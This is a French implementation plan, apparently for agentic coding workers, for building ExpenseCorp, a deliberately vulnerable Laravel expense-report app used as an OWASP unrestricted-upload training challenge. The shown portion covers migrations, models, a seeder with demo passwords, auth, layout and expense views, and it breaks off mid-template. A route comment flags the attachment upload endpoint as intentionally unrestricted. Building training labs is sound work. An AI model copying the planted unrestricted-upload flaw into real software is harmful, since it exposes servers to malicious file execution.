# OWASP A06 — ExpenseCorp (Upload non restreint) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Construire ExpenseCorp, une application Laravel de gestion de notes de frais avec une vulnérabilité d'upload non restreint volontairement intégrée.

**Architecture:** Application Laravel 13 MVC classique, 5 contrôleurs (Auth, Dashboard, Expense, Attachment, Challenge), 3 modèles Eloquent (User, ExpenseReport, Attachment), vues Blade avec layout sidebar Tailwind CDN. La vulnérabilité est dans `AttachmentController::store` uniquement.

**Tech Stack:** PHP 8.5 · Laravel 13 · MySQL 8.4 · Tailwind CDN · Pint · PHPStan (Larastan 3)

**Répertoire de travail :** `owasp-06/` — toutes les commandes `docker compose exec backend` s'exécutent depuis la racine du dépôt.

---

## Task 1 : Migrations

**Files:**
- Create: `owasp-06/database/migrations/0001_01_01_000003_add_role_to_users_table.php`
- Create: `owasp-06/database/migrations/0001_01_01_000004_create_expense_reports_table.php`
- Create: `owasp-06/database/migrations/0001_01_01_000005_create_attachments_table.php`

- [ ] **Créer la migration `add_role_to_users_table`**

```php
<?php

declare(strict_types=1);

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->string('role')->default('employee')->after('email');
        });
    }

    public function down(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->dropColumn('role');
        });
    }
};
```

- [ ] **Créer la migration `create_expense_reports_table`**

```php
<?php

declare(strict_types=1);

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('expense_reports', function (Blueprint $table) {
            $table->id();
            $table->foreignId('user_id')->constrained()->cascadeOnDelete();
            $table->string('title');
            $table->decimal('amount', 10, 2);
            $table->string('category');
            $table->text('description')->nullable();
            $table->string('status')->default('en_attente');
            $table->date('expense_date');
            $table->timestamps();
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('expense_reports');
    }
};
```

- [ ] **Créer la migration `create_attachments_table`**

```php
<?php

declare(strict_types=1);

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('attachments', function (Blueprint $table) {
            $table->id();
            $table->foreignId('expense_report_id')->constrained()->cascadeOnDelete();
            $table->foreignId('user_id')->constrained()->cascadeOnDelete();
            $table->string('original_name');
            $table->string('stored_path');
            $table->string('mime_type');
            $table->timestamps();
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('attachments');
    }
};
```

- [ ] **Commit**

```bash
git add owasp-06/database/migrations/
git commit -m "feat(owasp-06): add migrations for role, expense_reports, attachments"
```

---

## Task 2 : Modèles

**Files:**
- Modify: `owasp-06/app/Models/User.php`
- Create: `owasp-06/app/Models/ExpenseReport.php`
- Create: `owasp-06/app/Models/Attachment.php`

- [ ] **Modifier `User.php` — ajouter `role` en fillable et la relation `expenseReports`**

```php
<?php

namespace App\Models;

use Database\Factories\UserFactory;
use Illuminate\Database\Eloquent\Attributes\Fillable;
use Illuminate\Database\Eloquent\Attributes\Hidden;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;

#[Fillable(['name', 'email', 'password', 'role'])]
#[Hidden(['password', 'remember_token'])]
class User extends Authenticatable
{
    /** @use HasFactory<UserFactory> */
    use HasFactory, Notifiable;

    /**
     * @return HasMany<ExpenseReport, $this>
     */
    public function expenseReports(): HasMany
    {
        return $this->hasMany(ExpenseReport::class);
    }

    /**
     * @return array<string, string>
     */
    protected function casts(): array
    {
        return [
            'email_verified_at' => 'datetime',
            'password' => 'hashed',
        ];
    }
}
```

- [ ] **Créer `ExpenseReport.php`**

```php
<?php

namespace App\Models;

use Database\Factories\ExpenseReportFactory;
use Illuminate\Database\Eloquent\Attributes\Fillable;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;

#[Fillable(['user_id', 'title', 'amount', 'category', 'description', 'status', 'expense_date'])]
class ExpenseReport extends Model
{
    /** @use HasFactory<ExpenseReportFactory> */
    use HasFactory;

    /**
     * @return BelongsTo<User, $this>
     */
    public function user(): BelongsTo
    {
        return $this->belongsTo(User::class);
    }

    /**
     * @return HasMany<Attachment, $this>
     */
    public function attachments(): HasMany
    {
        return $this->hasMany(Attachment::class);
    }

    /**
     * @return array<string, string>
     */
    protected function casts(): array
    {
        return [
            'expense_date' => 'date',
            'amount' => 'decimal:2',
        ];
    }
}
```

- [ ] **Créer `Attachment.php`**

```php
<?php

namespace App\Models;

use Database\Factories\AttachmentFactory;
use Illuminate\Database\Eloquent\Attributes\Fillable;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;

#[Fillable(['expense_report_id', 'user_id', 'original_name', 'stored_path', 'mime_type'])]
class Attachment extends Model
{
    /** @use HasFactory<AttachmentFactory> */
    use HasFactory;

    /**
     * @return BelongsTo<ExpenseReport, $this>
     */
    public function expenseReport(): BelongsTo
    {
        return $this->belongsTo(ExpenseReport::class);
    }

    /**
     * @return BelongsTo<User, $this>
     */
    public function user(): BelongsTo
    {
        return $this->belongsTo(User::class);
    }
}
```

- [ ] **Commit**

```bash
git add owasp-06/app/Models/
git commit -m "feat(owasp-06): add User role + ExpenseReport and Attachment models"
```

---

## Task 3 : Factories & Seeder

**Files:**
- Modify: `owasp-06/database/factories/UserFactory.php`
- Create: `owasp-06/database/factories/ExpenseReportFactory.php`
- Create: `owasp-06/database/factories/AttachmentFactory.php`
- Modify: `owasp-06/database/seeders/DatabaseSeeder.php`

- [ ] **Modifier `UserFactory.php` — ajouter le champ `role`**

```php
<?php

namespace Database\Factories;

use App\Models\User;
use Illuminate\Database\Eloquent\Factories\Factory;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

/**
 * @extends Factory<User>
 */
class UserFactory extends Factory
{
    protected static ?string $password;

    /**
     * @return array<string, mixed>
     */
    public function definition(): array
    {
        return [
            'name' => fake()->name(),
            'email' => fake()->unique()->safeEmail(),
            'email_verified_at' => now(),
            'password' => static::$password ??= Hash::make('password'),
            'role' => 'employee',
            'remember_token' => Str::random(10),
        ];
    }

    public function unverified(): static
    {
        return $this->state(fn (array $attributes) => [
            'email_verified_at' => null,
        ]);
    }

    public function admin(): static
    {
        return $this->state(fn (array $attributes) => [
            'role' => 'admin',
        ]);
    }
}
```

- [ ] **Créer `ExpenseReportFactory.php`**

```php
<?php

namespace Database\Factories;

use App\Models\ExpenseReport;
use App\Models\User;
use Illuminate\Database\Eloquent\Factories\Factory;

/**
 * @extends Factory<ExpenseReport>
 */
class ExpenseReportFactory extends Factory
{
    /**
     * @return array<string, mixed>
     */
    public function definition(): array
    {
        return [
            'user_id' => User::factory(),
            'title' => fake()->sentence(4),
            'amount' => fake()->randomFloat(2, 10, 500),
            'category' => fake()->randomElement(['transport', 'repas', 'hébergement', 'fournitures', 'autre']),
            'description' => fake()->optional()->sentence(),
            'status' => 'en_attente',
            'expense_date' => fake()->dateTimeBetween('-3 months', 'now')->format('Y-m-d'),
        ];
    }

    public function approved(): static
    {
        return $this->state(fn (array $attributes) => ['status' => 'approuvée']);
    }

    public function rejected(): static
    {
        return $this->state(fn (array $attributes) => ['status' => 'rejetée']);
    }
}
```

- [ ] **Créer `AttachmentFactory.php`**

```php
<?php

namespace Database\Factories;

use App\Models\Attachment;
use App\Models\ExpenseReport;
use App\Models\User;
use Illuminate\Database\Eloquent\Factories\Factory;

/**
 * @extends Factory<Attachment>
 */
class AttachmentFactory extends Factory
{
    /**
     * @return array<string, mixed>
     */
    public function definition(): array
    {
        $name = fake()->word() . '.pdf';

        return [
            'expense_report_id' => ExpenseReport::factory(),
            'user_id' => User::factory(),
            'original_name' => $name,
            'stored_path' => 'uploads/' . $name,
            'mime_type' => 'application/pdf',
        ];
    }
}
```

- [ ] **Remplacer `DatabaseSeeder.php`**

```php
<?php

namespace Database\Seeders;

use App\Models\Attachment;
use App\Models\ExpenseReport;
use App\Models\User;
use Illuminate\Database\Console\Seeds\WithoutModelEvents;
use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Hash;

class DatabaseSeeder extends Seeder
{
    use WithoutModelEvents;

    public function run(): void
    {
        $alice = User::factory()->create([
            'name' => 'Alice Moreau',
            'email' => 'alice@expensecorp.local',
            'password' => Hash::make('alice123'),
            'role' => 'employee',
        ]);

        $bob = User::factory()->create([
            'name' => 'Bob Durand',
            'email' => 'bob@expensecorp.local',
            'password' => Hash::make('bob456'),
            'role' => 'employee',
        ]);

        User::factory()->admin()->create([
            'name' => 'Admin RH',
            'email' => 'admin@expensecorp.local',
            'password' => Hash::make('rh-admin2024'),
        ]);

        ExpenseReport::factory()->approved()->create([
            'user_id' => $alice->id,
            'title' => 'Déjeuner client Accenture — Paris 8e',
            'amount' => 87.50,
            'category' => 'repas',
            'description' => 'Déjeuner de travail avec le directeur technique d\'Accenture pour la présentation du projet Q2.',
            'expense_date' => '2026-05-14',
        ]);

        ExpenseReport::factory()->create([
            'user_id' => $alice->id,
            'title' => 'Train Paris-Lyon — séminaire annuel',
            'amount' => 124.00,
            'category' => 'transport',
            'description' => 'Billet TGV aller-retour pour le séminaire commercial du 28 mai.',
            'expense_date' => '2026-05-28',
        ]);

        ExpenseReport::factory()->rejected()->create([
            'user_id' => $bob->id,
            'title' => 'Abonnement logiciel — Figma Pro',
            'amount' => 45.00,
            'category' => 'fournitures',
            'description' => 'Renouvellement annuel de la licence Figma. Refusé : non budgété.',
            'expense_date' => '2026-04-03',
        ]);

        ExpenseReport::factory()->create([
            'user_id' => $bob->id,
            'title' => 'Hôtel Ibis — déplacement Lyon',
            'amount' => 95.00,
            'category' => 'hébergement',
            'description' => 'Une nuit à Lyon pour le séminaire commercial.',
            'expense_date' => '2026-05-28',
        ]);
    }
}
```

- [ ] **Commit**

```bash
git add owasp-06/database/factories/ owasp-06/database/seeders/
git commit -m "feat(owasp-06): add factories and seeder for ExpenseCorp"
```

---

## Task 4 : Routes + AuthController + vue login

**Files:**
- Modify: `owasp-06/routes/web.php`
- Create: `owasp-06/app/Http/Controllers/AuthController.php`
- Create: `owasp-06/resources/views/auth/login.blade.php`

- [ ] **Remplacer `routes/web.php`**

```php
<?php

declare(strict_types=1);

use App\Http\Controllers\AttachmentController;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\ChallengeController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\ExpenseController;
use Illuminate\Support\Facades\Route;

Route::middleware('guest')->group(function () {
    Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
    Route::post('/login', [AuthController::class, 'login']);
});

Route::post('/logout', [AuthController::class, 'logout'])->middleware('auth')->name('logout');

Route::middleware('auth')->group(function () {
    Route::get('/', [DashboardController::class, 'index'])->name('dashboard');

    Route::get('/expenses', [ExpenseController::class, 'index'])->name('expenses.index');
    Route::get('/expenses/create', [ExpenseController::class, 'create'])->name('expenses.create');
    Route::post('/expenses', [ExpenseController::class, 'store'])->name('expenses.store');
    Route::get('/expenses/{expense}', [ExpenseController::class, 'show'])->name('expenses.show');

    // ⚠️ VULNÉRABLE — upload sans restriction de type, taille ou emplacement
    Route::post('/expenses/{expense}/attachments', [AttachmentController::class, 'store'])->name('attachments.store');

    Route::get('/challenges', [ChallengeController::class, 'index'])->name('challenges.index');
});
```

- [ ] **Créer `AuthController.php`**

```php
<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\View\View;

class AuthController extends Controller
{
    public function showLogin(): View
    {
        return view('auth.login');
    }

    public function login(Request $request): RedirectResponse
    {
        $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required'],
        ]);

        $user = User::query()->where('email', $request->email)->first();

        /** @var string $password */
        $password = $request->input('password', '');

        if (! $user instanceof User || ! Hash::check($password, $user->password)) {
            return back()
                ->withErrors(['email' => 'Identifiants incorrects.'])
                ->onlyInput('email');
        }

        Auth::login($user, $request->boolean('remember'));
        $request->session()->regenerate();

        return redirect()->intended(route('dashboard'));
    }

    public function logout(Request $request): RedirectResponse
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
```

- [ ] **Créer `resources/views/auth/login.blade.php`**

```blade
<!DOCTYPE html>
<html lang="fr" class="h-full bg-gray-50">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion — ExpenseCorp</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="h-full flex items-center justify-center">
<div class="w-full max-w-sm">
    <div class="text-center mb-8">
        <div class="inline-flex items-center justify-center w-12 h-12 bg-indigo-600 rounded-xl mb-4">
            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                      d="M9 14l6-6m-5.5.5h.01m4.99 5h.01M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16l3.5-2 3.5 2 3.5-2 3.5 2z"/>
            </svg>
        </div>
        <h1 class="text-2xl font-bold text-gray-900">ExpenseCorp</h1>
        <p class="text-sm text-gray-500 mt-1">Gestion des notes de frais</p>
    </div>

    <div class="bg-white rounded-2xl shadow-sm border border-gray-200 px-8 py-8">
        <h2 class="text-base font-semibold text-gray-900 mb-6">Connexion</h2>

        <form method="POST" action="{{ route('login') }}" class="space-y-5">
            @csrf

            <div>
                <label for="email" class="block text-sm font-medium text-gray-700 mb-1.5">Adresse e-mail</label>
                <input type="email" id="email" name="email" value="{{ old('email') }}" required autofocus
                       class="w-full px-3.5 py-2.5 rounded-lg border text-sm
                              {{ $errors->has('email') ? 'border-red-400 bg-red-50' : 'border-gray-300' }}
                              focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent">
                @error('email')
                    <p class="mt-1.5 text-xs text-red-600">{{ $message }}</p>
                @enderror
            </div>

            <div>
                <label for="password" class="block text-sm font-medium text-gray-700 mb-1.5">Mot de passe</label>
                <input type="password" id="password" name="password" required
                       class="w-full px-3.5 py-2.5 rounded-lg border border-gray-300 text-sm
                              focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent">
            </div>

            <button type="submit"
                    class="w-full py-2.5 px-4 bg-indigo-600 hover:bg-indigo-700 text-white text-sm font-medium rounded-lg transition-colors">
                Se connecter
            </button>
        </form>
    </div>
</div>
</body>
</html>
```

- [ ] **Formatter avec Pint**

```bash
docker compose exec backend vendor/bin/pint --dirty
```

- [ ] **Commit**

```bash
git add owasp-06/routes/ owasp-06/app/Http/Controllers/AuthController.php owasp-06/resources/views/auth/
git commit -m "feat(owasp-06): add auth controller, routes and login view"
```

---

## Task 5 : Layout principal

**Files:**
- Create: `owasp-06/resources/views/layouts/app.blade.php`

- [ ] **Créer `layouts/app.blade.php`**

```blade
<!DOCTYPE html>
<html lang="fr" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>ExpenseCorp — @yield('title', 'Accueil')</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="h-full bg-gray-50 flex">

    {{-- Sidebar --}}
    <aside class="w-60 shrink-0 bg-white border-r border-gray-200 flex flex-col h-screen sticky top-0">
        {{-- Logo --}}
        <div class="px-5 py-5 border-b border-gray-100">
            <div class="flex items-center gap-2.5">
                <div class="w-8 h-8 bg-indigo-600 rounded-lg flex items-center justify-center shrink-0">
                    <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                              d="M9 14l6-6m-5.5.5h.01m4.99 5h.01M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16l3.5-2 3.5 2 3.5-2 3.5 2z"/>
                    </svg>
                </div>
                <span class="text-lg font-bold text-gray-900 tracking-tight">ExpenseCorp</span>
            </div>
        </div>

        {{-- Nav --}}
        <nav class="flex-1 px-3 py-4 space-y-0.5 overflow-y-auto">
            <a href="{{ route('dashboard') }}"
               class="flex items-center gap-3 px-3 py-2 rounded-lg text-sm font-medium transition-colors
                      {{ request()->routeIs('dashboard') ? 'bg-indigo-50 text-indigo-700' : 'text-gray-600 hover:bg-gray-50 hover:text-gray-900' }}">
                <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                          d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/>
                </svg>
                Tableau de bord
            </a>

            <a href="{{ route('expenses.index') }}"
               class="flex items-center gap-3 px-3 py-2 rounded-lg text-sm font-medium transition-colors
                      {{ request()->routeIs('expenses.*') ? 'bg-indigo-50 text-indigo-700' : 'text-gray-600 hover:bg-gray-50 hover:text-gray-900' }}">
                <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                          d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
                </svg>
                Mes notes de frais
            </a>

            <div class="pt-3 mt-3 border-t border-gray-100">
                <a href="{{ route('challenges.index') }}"
                   class="flex items-center gap-3 px-3 py-2 rounded-lg text-sm font-medium transition-colors
                          {{ request()->routeIs('challenges.*') ? 'bg-amber-50 text-amber-700' : 'text-gray-600 hover:bg-amber-50 hover:text-amber-700' }}">
                    <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                              d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                    </svg>
                    Challenges OWASP
                </a>
            </div>
        </nav>

        {{-- User / logout --}}
        <div class="px-3 py-4 border-t border-gray-100">
            <div class="flex items-center gap-3 px-3 py-2 mb-1">
                <div class="w-8 h-8 rounded-full bg-indigo-100 flex items-center justify-center shrink-0">
                    <span class="text-sm font-semibold text-indigo-700">
                        {{ strtoupper(substr(auth()->user()->name, 0, 1)) }}
                    </span>
                </div>
                <div class="min-w-0">
                    <p class="text-sm font-medium text-gray-900 truncate">{{ auth()->user()->name }}</p>
                    <span class="inline-flex items-center px-1.5 py-0.5 rounded text-xs font-medium
                        {{ auth()->user()->role === 'admin' ? 'bg-red-100 text-red-700' : 'bg-gray-100 text-gray-600' }}">
                        {{ auth()->user()->role }}
                    </span>
                </div>
            </div>
            <form method="POST" action="{{ route('logout') }}">
                @csrf
                <button type="submit"
                        class="w-full flex items-center gap-3 px-3 py-2 rounded-lg text-sm text-gray-500 hover:bg-gray-50 hover:text-gray-700 transition-colors">
                    <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                              d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/>
                    </svg>
                    Déconnexion
                </button>
            </form>
        </div>
    </aside>

    {{-- Main --}}
    <main class="flex-1 min-w-0 overflow-y-auto">
        <div class="max-w-5xl mx-auto px-8 py-8">

            @if(session('success'))
            <div class="mb-6 flex items-center gap-3 px-4 py-3 bg-green-50 border border-green-200 rounded-lg">
                <svg class="w-5 h-5 text-green-500 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
                <p class="text-sm text-green-700">{{ session('success') }}</p>
            </div>
            @endif

            @if(session('error'))
            <div class="mb-6 flex items-center gap-3 px-4 py-3 bg-red-50 border border-red-200 rounded-lg">
                <svg class="w-5 h-5 text-red-500 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
                <p class="text-sm text-red-700">{{ session('error') }}</p>
            </div>
            @endif

            @yield('content')
        </div>
    </main>

</body>
</html>
```

- [ ] **Commit**

```bash
git add owasp-06/resources/views/layouts/
git commit -m "feat(owasp-06): add main layout with sidebar"
```

---

## Task 6 : Dashboard

**Files:**
- Create: `owasp-06/app/Http/Controllers/DashboardController.php`
- Create: `owasp-06/resources/views/dashboard.blade.php`

- [ ] **Créer `DashboardController.php`**

```php
<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Models\ExpenseReport;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;

class DashboardController extends Controller
{
    public function index(): View
    {
        /** @var User $currentUser */
        $currentUser = Auth::user();

        $totalCount = ExpenseReport::query()->where('user_id', $currentUser->id)->count();

        $totalAmount = ExpenseReport::query()
            ->where('user_id', $currentUser->id)
            ->where('status', 'approuvée')
            ->sum('amount');

        $pendingCount = ExpenseReport::query()
            ->where('user_id', $currentUser->id)
            ->where('status', 'en_attente')
            ->count();

        $recentExpenses = ExpenseReport::query()
            ->where('user_id', $currentUser->id)
            ->orderByDesc('created_at')
            ->limit(3)
            ->get();

        return view('dashboard', compact('totalCount', 'totalAmount', 'pendingCount', 'recentExpenses'));
    }
}
```

- [ ] **Créer `resources/views/dashboard.blade.php`**

```blade
@extends('layouts.app')

@section('title', 'Tableau de bord')

@section('content')
<div class="space-y-8">

    <div>
        <h1 class="text-2xl font-bold text-gray-900">Tableau de bord</h1>
        <p class="text-sm text-gray-500 mt-1">Bienvenue, {{ auth()->user()->name }}</p>
    </div>

    {{-- Stats --}}
    <div class="grid grid-cols-3 gap-5">
        <div class="bg-white rounded-xl border border-gray-200 px-6 py-5">
            <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-1">Notes soumises</p>
            <p class="text-3xl font-bold text-gray-900">{{ $totalCount }}</p>
        </div>
        <div class="bg-white rounded-xl border border-gray-200 px-6 py-5">
            <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-1">Montant remboursé</p>
            <p class="text-3xl font-bold text-gray-900">{{ number_format((float) $totalAmount, 2, ',', ' ') }} €</p>
        </div>
        <div class="bg-white rounded-xl border border-gray-200 px-6 py-5">
            <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-1">En attente</p>
            <p class="text-3xl font-bold text-amber-600">{{ $pendingCount }}</p>
        </div>
    </div>

    {{-- Recent expenses --}}
    <div class="bg-white rounded-xl border border-gray-200 overflow-hidden">
        <div class="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
            <h2 class="text-sm font-semibold text-gray-900">Notes récentes</h2>
            <a href="{{ route('expenses.index') }}" class="text-xs text-indigo-600 hover:text-indigo-700 font-medium">Voir tout</a>
        </div>
        @if($recentExpenses->isEmpty())
        <div class="px-6 py-8 text-center">
            <p class="text-sm text-gray-400">Aucune note de frais pour l'instant.</p>
            <a href="{{ route('expenses.create') }}"
               class="mt-3 inline-flex items-center gap-2 px-4 py-2 bg-indigo-600 text-white text-sm font-medium rounded-lg hover:bg-indigo-700 transition-colors">
                Créer ma première note
            </a>
        </div>
        @else
        <div class="divide-y divide-gray-100">
            @foreach($recentExpenses as $expense)
            <div class="px-6 py-4 flex items-center justify-between">
                <div>
                    <p class="text-sm font-medium text-gray-900">{{ $expense->title }}</p>
                    <p class="text-xs text-gray-500 mt-0.5">{{ $expense->expense_date->format('d/m/Y') }} · {{ $expense->category }}</p>
                </div>
                <div class="flex items-center gap-4">
                    <span class="text-sm font-semibold text-gray-900">{{ number_format((float) $expense->amount, 2, ',', ' ') }} €</span>
                    @php
                        $statusClasses = match($expense->status) {
                            'approuvée' => 'bg-green-100 text-green-700',
                            'rejetée'   => 'bg-red-100 text-red-700',
                            default     => 'bg-amber-100 text-amber-700',
                        };
                    @endphp
                    <span class="px-2 py-0.5 rounded-full text-xs font-medium {{ $statusClasses }}">
                        {{ $expense->status }}
                    </span>
                </div>
            </div>
            @endforeach
        </div>
        @endif
    </div>

</div>
@endsection
```

- [ ] **Formatter avec Pint**

```bash
docker compose exec backend vendor/bin/pint --dirty
```

- [ ] **Commit**

```bash
git add owasp-06/app/Http/Controllers/DashboardController.php owasp-06/resources/views/dashboard.blade.php
git commit -m "feat(owasp-06): add dashboard controller and view"
```

---

## Task 7 : ExpenseController + vues notes de frais

**Files:**
- Create: `owasp-06/app/Http/Controllers/ExpenseController.php`
- Create: `owasp-06/resources/views/expenses/index.blade.php`
- Create: `owasp-06/resources/views/expenses/create.blade.php`
- Create: `owasp-06/resources/views/expenses/show.blade.php`

- [ ] **Créer `ExpenseController.php`**

```php
<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Models\ExpenseReport;
use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;

class ExpenseController extends Controller
{
    public function index(): View
    {
        /** @var User $currentUser */
        $currentUser = Auth::user();

        $expenses = ExpenseReport::query()
            ->where('user_id', $currentUser->id)
            ->orderByDesc('expense_date')
            ->get();

        return view('expenses.index', compact('expenses'));
    }

    public function create(): View
    {
        return view('expenses.create');
    }

    public function store(Request $request): RedirectResponse
    {
        /** @var User $currentUser */
        $currentUser = Auth::user();

        $request->validate([
            'title' => ['required', 'string', 'max:255'],
            'amount' => ['required', 'numeric', 'min:0.01', 'max:99999.99'],
            'category' => ['required', 'in:transport,repas,hébergement,fournitures,autre'],
            'description' => ['nullable', 'string', 'max:1000'],
            'expense_date' => ['required', 'date'],
        ]);

        /** @var array<string, mixed> $data */
        $data = $request->only(['title', 'amount', 'category', 'description', 'expense_date']);
        $data['user_id'] = $currentUser->id;

        $expense = ExpenseReport::query()->create($data);

        return redirect()->route('expenses.show', $expense)
            ->with('success', 'Note de frais créée avec succès.');
    }

    public function show(ExpenseReport $expense): View
    {
        /** @var User $currentUser */
        $currentUser = Auth::user();

        abort_if($expense->user_id !== $currentUser->id, 403);

        $expense->load('attachments');

        return view('expenses.show', compact('expense'));
    }
}
```

- [ ] **Créer `resources/views/expenses/index.blade.php`**

```blade
@extends('layouts.app')

@section('title', 'Mes notes de frais')

@section('content')
<div class="space-y-6">

    <div class="flex items-center justify-between">
        <div>
            <h1 class="text-2xl font-bold text-gray-900">Mes notes de frais</h1>
            <p class="text-sm text-gray-500 mt-1">{{ $expenses->count() }} note(s)</p>
        </div>
        <a href="{{ route('expenses.create') }}"
           class="inline-flex items-center gap-2 px-4 py-2 bg-indigo-600 text-white text-sm font-medium rounded-lg hover:bg-indigo-700 transition-colors">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/>
            </svg>
            Nouvelle note
        </a>
    </div>

    @if($expenses->isEmpty())
    <div class="bg-white rounded-xl border border-gray-200 px-6 py-12 text-center">
        <svg class="w-10 h-10 text-gray-300 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                  d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
        </svg>
        <p class="text-sm text-gray-500">Aucune note de frais. Créez-en une !</p>
    </div>
    @else
    <div class="bg-white rounded-xl border border-gray-200 overflow-hidden">
        <table class="w-full text-sm">
            <thead>
                <tr class="border-b border-gray-100 text-left">
                    <th class="px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Titre</th>
                    <th class="px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Date</th>
                    <th class="px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Catégorie</th>
                    <th class="px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider text-right">Montant</th>
                    <th class="px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Statut</th>
                    <th class="px-6 py-3"></th>
                </tr>
            </thead>
            <tbody class="divide-y divide-gray-100">
                @foreach($expenses as $expense)
                @php
                    $statusClasses = match($expense->status) {
                        'approuvée' => 'bg-green-100 text-green-700',
                        'rejetée'   => 'bg-red-100 text-red-700',
                        default     => 'bg-amber-100 text-amber-700',
                    };
                @endphp
